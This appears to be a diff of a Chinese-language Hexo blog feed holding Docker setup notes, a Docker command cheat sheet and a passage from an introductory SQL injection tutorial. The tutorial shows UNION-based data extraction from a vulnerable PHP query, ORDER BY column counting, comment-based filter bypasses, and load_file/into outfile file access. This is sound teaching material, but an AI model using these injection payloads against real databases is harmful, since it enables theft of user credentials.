+<h1 id="部署es-kibana"><a href="#部署es-kibana" class="headerlink" title="部署es+kibana"></a>部署es+kibana</h1><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">--net somenetwork  网络配置</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动</span></span><br><span class="line">docker run -d --name elasticsearch (--net somenetwork) -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; elasticsearch:8.8.1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动了 1inux就卡住了</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">es 暴露的端口很多!</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">es 十分的耗内存</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">es 的数据一般霉要放置到安全目录!挂载</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">docker stats 查看 cpu的状态</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">测试一下es构建是否成功</span></span><br><span class="line">    curl localhost:9200</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">马上关闭，增加内存限制 修改配置文件 -e 环境配置修改</span></span><br><span class="line">docker run -d --name elasticsearch -p 9200:9200 -p 9300:9300 -e &quot;discovery.type=single-node&quot; -e ES_JAVA_OPTS=&quot;-Xms64m -Xmx512m&quot; elasticsearch:8.8.1</span><br></pre></td></tr></table></figure>
+
+<h1 id="安装vim"><a href="#安装vim" class="headerlink" title="安装vim"></a>安装vim</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install vim</span><br></pre></td></tr></table></figure>
+
+<h1 id="安装php和php插件"><a href="#安装php和php插件" class="headerlink" title="安装php和php插件"></a>安装php和php插件</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install php -y</span><br><span class="line">apt-get install libapache2-mod-php -y  --fix-missing</span><br><span class="line">apt-get install php7.0-mysql</span><br></pre></td></tr></table></figure>
+
+<h1 id="可视化"><a href="#可视化" class="headerlink" title="可视化"></a>可视化</h1><p><strong>什么 portainer ?</strong><br>Docker图形化界面管理工具!提供一个后台面板供我们操作 !</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8088:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainer</span><br></pre></td></tr></table></figure>
+
+<p>访问测试：端口打开8088  访问<a href="http://ip:8088/">http://ip:8088/</a></p>
+<h1 id="commit镜像"><a href="#commit镜像" class="headerlink" title="commit镜像"></a>commit镜像</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker commit 提交容器成为一个新的副本</span><br><span class="line"></span><br><span class="line">#命今和git原理类似</span><br><span class="line">docker commit -m=&quot;提交的描述信息”-a=&quot;作者”容器id 目标镜像名:[TAG]</span><br><span class="line"></span><br><span class="line">实战测试</span><br><span class="line"># 1、启动一个默认的tomcat</span><br><span class="line"># 2、发现这个默认的tomcat 是没有webapps应用，镜像的原因，官方的镜像默认 webapps下面是没有文件的!</span><br><span class="line"># 3、我自己拷贝进去了基本的文件</span><br><span class="line"># 4、将我们操作过的容器通过commit提交为一个境像! 我们以后就使用我们修改过的镜像即可，这就是我们自己的一个修改的镜像</span><br></pre></td></tr></table></figure>
 ]]></content>
       <tags>
         <tag>Docker</tag>
@@ -655,573 +894,6 @@
 ]]></content>
       <tags>
         <tag>Java</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Docker命令</title>
-    <url>/2023/07/31/Docker%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<h1 id="Docker的常用命令"><a href="#Docker的常用命令" class="headerlink" title="Docker的常用命令"></a>Docker的常用命令</h1><span id="more"></span>
-
-<h2 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker version      #显示docker的版本信息</span><br><span class="line">docker info            #显示docker的系统信息，包括境像和容器的数量</span><br><span class="line">docker 命令 --help# 帮助命令</span><br><span class="line"></span><br><span class="line">帮助文档的地址：https://docs.docker.com/engine/reference/commandline</span><br></pre></td></tr></table></figure>
-
-<h2 id="镜像命令"><a href="#镜像命令" class="headerlink" title="镜像命令"></a>镜像命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images 查看所有本地的主机上的镜像</span><br><span class="line">[root@xxx /]# docker images</span><br><span class="line">REPOSITORY			TAG	    	IMAGE ID		      CREATED	         	SIZE</span><br><span class="line">he11o-world			Tatest		bf756fblae65		4 months ago		13.3kB</span><br><span class="line"></span><br><span class="line">解释</span><br><span class="line">REPOSITORY    镜像的仓库源</span><br><span class="line">TAG		      	 镜像的标签</span><br><span class="line">IMAGE ID		  镜像的id</span><br><span class="line">CREATED		  镜像的创建时间</span><br><span class="line">SIZE					镜像的大小</span><br><span class="line"></span><br><span class="line">#可选项</span><br><span class="line">-a，--all						   列出所有镜像</span><br><span class="line">-q，--quiet  				    只显示ID</span><br></pre></td></tr></table></figure>
-
-<h3 id="docker-search-搜索镜像"><a href="#docker-search-搜索镜像" class="headerlink" title="docker search 搜索镜像"></a>docker search 搜索镜像</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@xxx /]# docker search mysql</span><br><span class="line">NAME                            DESCRIPTION                                                    STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql                 MySQL is a widely used, open-source relation…    14338        [OK]       </span><br><span class="line">mariadb             MariaDB Server is a high performing open sou…   5474         [OK]       </span><br><span class="line"></span><br><span class="line">#可选项，通过搜藏来过滤</span><br><span class="line">--filter=STARS=3000# 搜索出来的镜像就是STARS大于3000的</span><br><span class="line"></span><br><span class="line">[root@xxx ~]# docker search mysql --filter=STARS=3000</span><br><span class="line">NAME        					 DESCRIPTION                              			  STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql     MySQL is a widely used, open-source relation…   	14338     [OK]       </span><br><span class="line">mariadb   MariaDB Server is a high performing open sou…    5474      [OK]       </span><br></pre></td></tr></table></figure>
-
-<h3 id="拉取镜像docker-pull-镜像名-tag"><a href="#拉取镜像docker-pull-镜像名-tag" class="headerlink" title="拉取镜像docker pull 镜像名[:tag]"></a><strong>拉取镜像docker pull 镜像名[:tag]</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@163 ~]# docker pull mysql</span><br><span class="line">Using default tag: latest  #如果不写tag，默认最新版本</span><br><span class="line">latest: Pulling from library/mysql</span><br><span class="line">72a69066d2fe: Pull complete 		#分层下载，docker  image的核心  联合文件系统</span><br><span class="line">93619dbc5b36: Pull complete </span><br><span class="line">99da31dd6142: Pull complete </span><br><span class="line">626033c43d70: Pull complete </span><br><span class="line">37d5d7efb64e: Pull complete </span><br><span class="line">ac563158d721: Pull complete </span><br><span class="line">d2ba16033dad: Pull complete </span><br><span class="line">688ba7d5c01a: Pull complete </span><br><span class="line">00e060b6d11d: Pull complete </span><br><span class="line">1c04857f594f: Pull complete </span><br><span class="line">4d7cfa90e6ea: Pull complete </span><br><span class="line">e0431212d27d: Pull complete </span><br><span class="line">Digest: sha256:e9027fe4d91c0153429607251656806cc784e914937271037f7738bd5b8e7709  #签名</span><br><span class="line">Status: Downloaded newer image for mysql:latest</span><br><span class="line">docker.io/library/mysql:latest	#真实地址</span><br><span class="line"></span><br><span class="line">*docker pull mysql等价于docker pull docker.io/library/mysql:latest</span><br><span class="line"></span><br><span class="line">*docker pull mysql:5.7</span><br><span class="line">[root@163 ~]# docker pull mysql:5.7</span><br><span class="line">5.7: Pulling from library/mysql</span><br><span class="line">72a69066d2fe: Already exists </span><br><span class="line">93619dbc5b36: Already exists </span><br><span class="line">99da31dd6142: Already exists </span><br><span class="line">626033c43d70: Already exists </span><br><span class="line">37d5d7efb64e: Already exists </span><br><span class="line">ac563158d721: Already exists </span><br><span class="line">d2ba16033dad: Already exists //以上为重复部分</span><br><span class="line">0ceb82207cd7: Pull complete </span><br><span class="line">37f2405cae96: Pull complete </span><br><span class="line">e2482e017e53: Pull complete </span><br><span class="line">70deed891d42: Pull complete </span><br><span class="line">Digest: sha256:f2ad209efe9c67104167fc609cca6973c8422939491c9345270175a300419f94</span><br><span class="line">Status: Downloaded newer image for mysql:5.7</span><br><span class="line">docker.io/library/mysql:5.7</span><br></pre></td></tr></table></figure>
-
-<h3 id="删除镜像docker-rmi"><a href="#删除镜像docker-rmi" class="headerlink" title="删除镜像docker rmi"></a>删除镜像docker rmi</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rmi -f   镜像ID			 //删除指定镜像</span><br><span class="line"></span><br><span class="line">docker rmi -f   镜像ID 镜像ID 镜像ID //删除多个镜像</span><br><span class="line"></span><br><span class="line">docker rmi -f  $(docker images -aq)	  //删除所有镜像</span><br></pre></td></tr></table></figure>
-
-<h2 id="容器命令"><a href="#容器命令" class="headerlink" title="容器命令"></a>容器命令</h2><p><strong>说明:我们有了镜像才可以创建容器，linux，下载一个 centos 镜像来测试学习</strong><br>docker pull centos</p>
-<h3 id="新建容器并启动"><a href="#新建容器并启动" class="headerlink" title="新建容器并启动"></a>新建容器并启动</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run [可选参数] image</span><br><span class="line"></span><br><span class="line">#参数说明</span><br><span class="line">--name=&quot;Name&quot;		   容器名字 tomcat01 tomcat02，用来区分容器</span><br><span class="line">-d									后台方式运行</span><br><span class="line">-it									使用交互方式运行，进入容器查看内容</span><br><span class="line"></span><br><span class="line">-p								   指定容器的端口-p  8080:8080</span><br><span class="line"></span><br><span class="line">     	 	-p ip:主机端口:容器端口</span><br><span class="line">			-p 主机端口:容器端口 (常用)</span><br><span class="line">			-p 容器端口</span><br><span class="line">			容器端口</span><br><span class="line"></span><br><span class="line">-P								   随机指定端口</span><br><span class="line"></span><br><span class="line">#测试，启动并进入容器</span><br><span class="line"></span><br><span class="line">[root@xxx ~]# docker run -it centos /bin/bash</span><br><span class="line"></span><br><span class="line">[root@c0eed8b69c30 /]# ls   //查看容器内的centos,基础版本，很多命令都不完善</span><br><span class="line">bin  etc   lib	  lost+found  mnt  proc  run   srv  tmp  var	</span><br><span class="line">dev  home  lib64  media       opt  root  sbin  sys  usr</span><br><span class="line"></span><br><span class="line">exit		//从容器中退回主机</span><br></pre></td></tr></table></figure>
-
-<h3 id="列出所有运行的容器"><a href="#列出所有运行的容器" class="headerlink" title="列出所有运行的容器"></a>列出所有运行的容器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#docker ps 命令</span><br><span class="line">     	列出当前正在运行的容器</span><br><span class="line"></span><br><span class="line">-a 		//列出当前正在运行的容器+带出历史运行过的容器</span><br><span class="line">-n=? 	// 显示最近创建的容器</span><br><span class="line">-q		//只显示容器的编号</span><br></pre></td></tr></table></figure>
-
-<h3 id="退出容器"><a href="#退出容器" class="headerlink" title="退出容器"></a>退出容器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit 				   //直接容器停止并退出  </span><br><span class="line"></span><br><span class="line">Ctrl + P + Q 	//容不停止退出</span><br></pre></td></tr></table></figure>
-
-<h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm 容器id		//删除指定的容器，不能除正在运行的容器，如果要强制刚除 rm -f</span><br><span class="line">docker rm -f $(docker ps -aq)		//删除所有的容器</span><br><span class="line">docker ps -a -q|xargs docker rm 		// 删除所有的容器</span><br></pre></td></tr></table></figure>
-
-<h3 id="启动和停止容器的操作"><a href="#启动和停止容器的操作" class="headerlink" title="启动和停止容器的操作"></a>启动和停止容器的操作</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker start 容器id			启动容器</span><br><span class="line">docker restart 容器id		重启容器</span><br><span class="line">docker stop 容器id			停止当前正在运行的容器</span><br><span class="line">docker kill 容器id			  强制停止当前容器</span><br></pre></td></tr></table></figure>
-
-<h2 id="常用其他命令"><a href="#常用其他命令" class="headerlink" title="常用其他命令"></a>常用其他命令</h2><p><strong>后台启动容器</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#命令 docker run -d 镜像名!</span><br><span class="line"></span><br><span class="line">[root@xxx /]# docker run -d centos</span><br><span class="line"></span><br><span class="line">#问题docker ps，发现 centos 停止了</span><br><span class="line"></span><br><span class="line">#常见的坑:docker 容器使用后台运行，就必须要有要一个前台进程，docker发现没有应用，就会自动停止</span><br><span class="line"></span><br><span class="line">#nginx，容器启动后，发现自己没有提供服务，就会立刻停止，就是没有程序了</span><br></pre></td></tr></table></figure>
-
-<p><strong>查看日志</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker logs -f -t --tail 容器，没有日志</span><br><span class="line"></span><br><span class="line">#自己编写一段shell脚本</span><br><span class="line"></span><br><span class="line">[root@xxx /]# docker run -d centos /bin/sh -c &quot;while true;do echo hhhhhh;sleep 1;done&quot;</span><br><span class="line"></span><br><span class="line">[root@xxx /]# docker ps</span><br><span class="line"></span><br><span class="line">CONTAINER ID			IMAGE</span><br><span class="line">dce7b86171bf			centos</span><br><span class="line"></span><br><span class="line">#显示日志</span><br><span class="line"></span><br><span class="line">-tf								//显示日志</span><br><span class="line"></span><br><span class="line">--tai1 number			//要显示日志条数</span><br><span class="line"></span><br><span class="line">[root@xxx /]# docker logs -tf --tai1 10 dce7b86171bf</span><br></pre></td></tr></table></figure>
-
-<p><strong>查看容器中进程信息</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#docker ps</span><br><span class="line">#命令docker top 容器id</span><br><span class="line">UID                 PID                 PPID        	    C                 STIME       </span><br><span class="line">root                1432624             1432594             0                   20:14     </span><br><span class="line">root                1452486             1432624             0                   20:20     </span><br></pre></td></tr></table></figure>
-
-<p><strong>查看镜像的元数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#命令 docker inspect 容器id</span><br></pre></td></tr></table></figure>
-
-<p><strong>进入当前正在运行的容器</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方式一：docker exec -it 容器id /bin/bash		//进入容器后开启一个新的终端，可以在里面操作</span><br><span class="line"></span><br><span class="line">方式二：docker attach 容器id		 				 //进入容器正在执行的终端，不会启动新的进程</span><br></pre></td></tr></table></figure>
-
-<p><strong>从容器内拷贝文件到主机上</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker  cp 容器id:容器内路径  目的的主机路径</span><br><span class="line"></span><br><span class="line">#查看当将主机目录下</span><br><span class="line"></span><br><span class="line">[root@163 home]# ls</span><br><span class="line">hhh.java  redis  www</span><br><span class="line">[root@163 home]#  docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED         STATUS         PORTS     NAMES</span><br><span class="line">69687a39e545   centos    &quot;/bin/bash&quot;   2 minutes ago   Up 2 minutes             vigilant_blackburn</span><br><span class="line"></span><br><span class="line">#进入docker容器内部</span><br><span class="line"></span><br><span class="line">[root@163 home]# docker attach 69687a39e545</span><br><span class="line">[root@69687a39e545 /]# cd /home</span><br><span class="line">[root@69687a39e545 home]# ls</span><br><span class="line"></span><br><span class="line">#在容器内新建一个文件</span><br><span class="line"></span><br><span class="line">[root@69687a39e545 home]# touch test.java</span><br><span class="line">[root@69687a39e545 home]# exit</span><br><span class="line">exit</span><br><span class="line">[root@163 home]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line">[root@163 home]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED         STATUS                      PORTS     NAMES</span><br><span class="line">69687a39e545   centos    &quot;/bin/bash&quot;   4 minutes ago   Exited (0) 31 seconds ago             vigilant_blackburn</span><br><span class="line"></span><br><span class="line">#将文件拷贝出来到主机上</span><br><span class="line"></span><br><span class="line">[root@163 home]# docker cp 69687a39e545:/home/test.java /home</span><br><span class="line">Successfully copied 1.54kB to /home</span><br><span class="line">[root@163 home]# ls</span><br><span class="line">hhh.java  redis  test.java  www</span><br><span class="line"></span><br><span class="line">#拷贝是一个手动过程，使用-v卷的技术可以实现</span><br></pre></td></tr></table></figure>
-
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230730205339571.png" alt="image-20230730205339571"></p>
-<table>
-<thead>
-<tr>
-<th align="center">attach</th>
-<th align="center">Attach to a running container</th>
-<th align="center">当前 she11 下 attach 连接指定运行镜像</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">build</td>
-<td align="center">Build an imagerfrom a Dockerfile</td>
-<td align="center">通过 Dockerfile 定制镜像</td>
-</tr>
-<tr>
-<td align="center">commit</td>
-<td align="center">Create a new image from a container changes</td>
-<td align="center">提交当前容器为新的镜像</td>
-</tr>
-<tr>
-<td align="center">cp</td>
-<td align="center">Copy files&#x2F;folders from the containers filesystem to the host path</td>
-<td align="center">从容器中搏贝指定文件或者目录到宿主机中</td>
-</tr>
-<tr>
-<td align="center">create</td>
-<td align="center">Create a new container</td>
-<td align="center">创建一个新的容器，同 run，但不启动容器</td>
-</tr>
-<tr>
-<td align="center">diff</td>
-<td align="center">Inspect changes on a container’s fiesystem</td>
-<td align="center">查看 docker 容器变化</td>
-</tr>
-<tr>
-<td align="center">events</td>
-<td align="center">Get real time events from the server</td>
-<td align="center">从 docker 服务获取容器实时事件</td>
-</tr>
-<tr>
-<td align="center">exec</td>
-<td align="center">Run a command in an existing container</td>
-<td align="center">在已存在的容器上运行命令</td>
-</tr>
-<tr>
-<td align="center">export</td>
-<td align="center">Stream the contents of a container as a tar archive</td>
-<td align="center">导出容器的内容作为一个 tar 归档文件[对应import]</td>
-</tr>
-<tr>
-<td align="center">history</td>
-<td align="center">Show the history of an image</td>
-<td align="center">展示一个镜像形成历史</td>
-</tr>
-<tr>
-<td align="center">images</td>
-<td align="center">List images</td>
-<td align="center">列出系统当前镜像</td>
-</tr>
-<tr>
-<td align="center">import</td>
-<td align="center">Create a new filesystem image from the contents of a tarball</td>
-<td align="center">从tar包中的内容创建一个新的文件系统映像[对应export]</td>
-</tr>
-<tr>
-<td align="center">info</td>
-<td align="center">Display system-wide information</td>
-<td align="center">显示系统相关信息</td>
-</tr>
-<tr>
-<td align="center">inspect</td>
-<td align="center">Return low-Tevel information on a container</td>
-<td align="center">查看容器详细信息</td>
-</tr>
-<tr>
-<td align="center">kill</td>
-<td align="center">Kill a running container</td>
-<td align="center">kill 指定 docker 容器</td>
-</tr>
-<tr>
-<td align="center">load</td>
-<td align="center">Load an image from a tar archive</td>
-<td align="center">从一个 tar 包中加载一个像[对应 save]</td>
-</tr>
-<tr>
-<td align="center">login</td>
-<td align="center">Register or Login to the docker registry server</td>
-<td align="center">注册或者陆一个 docker 源服务器</td>
-</tr>
-<tr>
-<td align="center">logout</td>
-<td align="center">Log out from a Docker registry server</td>
-<td align="center">从当前 Docker registry 退出</td>
-</tr>
-<tr>
-<td align="center">logs</td>
-<td align="center">Fetch the logs of a container</td>
-<td align="center">输出当前容器日志信息</td>
-</tr>
-<tr>
-<td align="center">port</td>
-<td align="center">Lookup the public-facing port which is NAT-ed to PRIVATE_PORT</td>
-<td align="center">查看映射端口对应的容器内部源端口</td>
-</tr>
-<tr>
-<td align="center">pause</td>
-<td align="center">Pause all processes within a container</td>
-<td align="center">暂停容器</td>
-</tr>
-<tr>
-<td align="center">ps</td>
-<td align="center">List containers</td>
-<td align="center">列出容器列表</td>
-</tr>
-<tr>
-<td align="center">pull</td>
-<td align="center">Pull an image or a repository from the docker registry server</td>
-<td align="center">从docker镜像源服务器拉取指定镜像或者库镜像</td>
-</tr>
-<tr>
-<td align="center">push</td>
-<td align="center">Push an image or a repository to the docker registry server</td>
-<td align="center">推送指定镜像或者库镜像至docker源服务器</td>
-</tr>
-<tr>
-<td align="center">restart</td>
-<td align="center">Restart a running container</td>
-<td align="center">重启运行的容器</td>
-</tr>
-<tr>
-<td align="center">rm</td>
-<td align="center">Remove one or more containers</td>
-<td align="center">移除一个或者多个容器</td>
-</tr>
-<tr>
-<td align="center">rmi</td>
-<td align="center">Remove one or more images</td>
-<td align="center">移除一个或多个镜像[无容器使用该镜像才可删除，否则需删除相关容器才可继续或 -f 强制删除]</td>
-</tr>
-<tr>
-<td align="center">run</td>
-<td align="center">Run a command in a new container</td>
-<td align="center">创建一个新的容器并运行一个命令</td>
-</tr>
-<tr>
-<td align="center">save</td>
-<td align="center">Save an image to a tar archive</td>
-<td align="center">保存一个镜像为一个 tar 包[对应 load]</td>
-</tr>
-<tr>
-<td align="center">search</td>
-<td align="center">Search for an image on the Docker Hub</td>
-<td align="center">在 docker hub 中搜索镜像</td>
-</tr>
-<tr>
-<td align="center">start</td>
-<td align="center">Start a stopped containers</td>
-<td align="center">启动容器</td>
-</tr>
-<tr>
-<td align="center">stop</td>
-<td align="center">Stop a running containers</td>
-<td align="center">停止容器</td>
-</tr>
-<tr>
-<td align="center">tag</td>
-<td align="center">Tag an image into a repository</td>
-<td align="center">给源中镜像打标签</td>
-</tr>
-<tr>
-<td align="center">top</td>
-<td align="center">Lookup the running processes of a container</td>
-<td align="center">查看容器中运行的进程信息</td>
-</tr>
-<tr>
-<td align="center">unpause</td>
-<td align="center">Unpause a paused container</td>
-<td align="center">取消暂停容器</td>
-</tr>
-<tr>
-<td align="center">version</td>
-<td align="center">Show the docker version information</td>
-<td align="center">查看 docker 版本号</td>
-</tr>
-<tr>
-<td align="center">wait</td>
-<td align="center">Block until a container stops，then print its exit code</td>
-<td align="center">截取容器止时的退出状态值</td>
-</tr>
-</tbody></table>
-]]></content>
-      <tags>
-        <tag>Docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL注入</title>
-    <url>/2023/08/04/SQL%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h2 id="SQL注入入门"><a href="#SQL注入入门" class="headerlink" title="SQL注入入门"></a>SQL注入入门</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>就不说奇奇怪怪书面语言了，大致意思就是通过可控输入点达到非预期执行数据库语句，这里的非预期指的是，拼接相应的语句可以拿到数据库里面的其他数据，具体看下面的Demo。</p>
-<p>比如下面的语句：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id = &quot;.$_GET[&quot;id&quot;];</span><br></pre></td></tr></table></figure>
-
-<p>对于他的预期操作，一般一个id是用来索引的,传入的值应该是：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_GET[&quot;id&quot;] = 1;</span><br><span class="line">$_GET[&quot;id&quot;] = 2;</span><br></pre></td></tr></table></figure>
-
-<p>所以预期执行的语句应该是：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id =  1&quot;;</span><br><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id =  2&quot;;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
-
-<p>在没有过滤的情况下，我们能够在后面拼接我们自己的语句</p>
-<p>比如，我们传入的值：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_GET[&quot;id&quot;] =&quot;1 union select username,password from user&quot;</span><br></pre></td></tr></table></figure>
-
-<p>那么最后执行的语句就是：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id = 1 union select username,password from user;&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304261635588.png" alt="image-20230426163533547"></p>
-<p>这样就造成了非预期语句的执行，我们在获得 <code>users</code> 表中的预期数据的同时也获得了 <code>users</code> 表中的非预期数据。</p>
-<p>当你看到这时，不需要对语句有具体了解，但你需要知道SQL注入是一个怎么样的过程。</p>
-<p>下面我们从数据库基础——结构 基本语法开始 一步一步引到您学会基础的SQL注入。</p>
-<h3 id="SQL数据库基础"><a href="#SQL数据库基础" class="headerlink" title="SQL数据库基础"></a>SQL数据库基础</h3><h4 id="数据库结构基础"><a href="#数据库结构基础" class="headerlink" title="数据库结构基础"></a>数据库结构基础</h4><p><img src="https://nssctf.wdf.ink//img/WDTJ/202304261646646.png" alt="image-20230426164654561"></p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304261652391.png" alt="image-20230426165200366"></p>
-<p>如图所示 数据库 为层级结构：</p>
-<ul>
-<li>数据库 ( database )</li>
-<li>表 ( table )<ul>
-<li>列 (column)</li>
-<li>数据</li>
-</ul>
-</li>
-</ul>
-<h4 id="数据库语法基础¶"><a href="#数据库语法基础¶" class="headerlink" title="数据库语法基础¶"></a>数据库语法基础<a href="https://ctf.tj.cn/ctf_web/sql_injection/#_3">¶</a></h4><p>常用语法：</p>
-<ul>
-<li><code>SELECT</code></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 列名1, 列名2, ... FROM 表名 WHERE 条件</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>UNION</code></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 列名 FROM 表名</span><br><span class="line">UNION</span><br><span class="line">SELECT 列名_1 FROM 表名_1;</span><br></pre></td></tr></table></figure>
-
-<p> 注意 使用 <code>UNION</code> 的时候要注意两个表的列数量必须相同。</p>
-<ul>
-<li><code>LIMIT</code></li>
-<li><code>SQL SELECT column1, column2, ... FROM table_name LIMIT number; #返回表中前number行数据 SELECT column1, column2, ... FROM table_name LIMIT offset, row_count; #从offset+1行开始返回row_count行数据 #比如 LIMIT 10, 10 返回11-20行数据</code></li>
-<li><code>SQL SELECT * FROM table_name ORDER BY column_name DESC LIMIT 10;</code></li>
-<li><code>注释</code></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = ((1)) union select username,password from user;-- )) limit1,1;后面的内容都将被注释</span><br><span class="line">DROP sampletable;# 后面的内容都将被注释</span><br><span class="line">  DROP/*comment*/sampletable`   DR/**/OP/*绕过过滤*/sampletable`    SELECT/*替换空格*/password/**/FROM/**/Members #/**/可用于替换空格</span><br><span class="line">  #/*中间的内容都将被注释*/</span><br><span class="line">  SELECT /*!32302 1/0, */ 1 FROM tablename #这种 /*! 注释仅在MySQL中存在</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>Order by</code></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column1, column2, ... FROM table_name [WHERE condition] ORDER BY column_name [ASC|DESC];</span><br><span class="line"># 其中，column1、column2等表示要查询的列名，table_name表示要查询的表名，condition表示查询条件，column_name表示要按照哪一列进行排序，ASC或DESC表示升序或降序排列。可以使用多个列名来进行排序，多个列名之间用逗号分隔。</span><br><span class="line"># 在SQL注入中我们常用它来判断列数</span><br><span class="line">SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 1;# 不报错</span><br><span class="line">SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 2;# 不报错</span><br><span class="line">SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 3;# 报错</span><br></pre></td></tr></table></figure>
-
-<p>常用参数：</p>
-<ul>
-<li><code>user()</code>：当前数据库用户</li>
-<li><code>database()</code>：当前数据库名</li>
-<li><code>version()</code>：当前使用的数据库版本</li>
-<li><code>@@datadir</code>：数据库存储数据路径</li>
-<li><code>concat()</code>：联合数据，用于联合两条数据结果。如 <code>concat(username,0x3a,password)</code></li>
-<li><code>group_concat()</code>：和 <code>concat()</code> 类似，如 <code>group_concat(DISTINCT+user,0x3a,password)</code>，用于把多条数据一次注入出来</li>
-<li><code>concat_ws()</code>：用法类似</li>
-<li><code>hex()</code> 和 <code>unhex()</code>：用于 hex 编码解码</li>
-<li><code>ASCII()</code>：返回字符的 ASCII 码值</li>
-<li><code>CHAR()</code>：把整数转换为对应的字符</li>
-<li><code>load_file()</code>：以文本方式读取文件，在 Windows 中，路径设置为 <code>\\</code></li>
-<li><code>select xxoo into outfile &#39;路径&#39;</code>：权限较高时可直接写文件</li>
-</ul>
-<h3 id="基础注入类型"><a href="#基础注入类型" class="headerlink" title="基础注入类型"></a>基础注入类型</h3><h4 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h4><p>我们开局举的例子就是一个很典型的数字型注入。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id = &quot;.$_GET[&quot;id&quot;];</span><br></pre></td></tr></table></figure>
-
-<p>我们可用理解为两个部分 原有语句 <code>SELECT username,password FROM users WHERE id =</code>和用户输入部分<code>$_GET[&quot;id&quot;]</code>。</p>
-<p>前面我们说到，这种语句一般用于用户输入id来索引查询，所以预期的输入都是数字，所以直接采用的直接拼接的方式，以数字的方式进行查询。</p>
-<p>然而，用户的输入因为没有过滤的缘故，不管输入什么都会直接拼接到后面，所以我们可用用下面的步骤逐步得到数据库信息：</p>
-<ul>
-<li>使用 <code>Order by</code> 确定列数，方便后续注入。</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id = 1 Order by 1;</span><br><span class="line">id = 1 Order by 2;</span><br><span class="line">id = 1 Order by 3; # 报错 确定列数为 2 </span><br></pre></td></tr></table></figure>
-
-<ul>
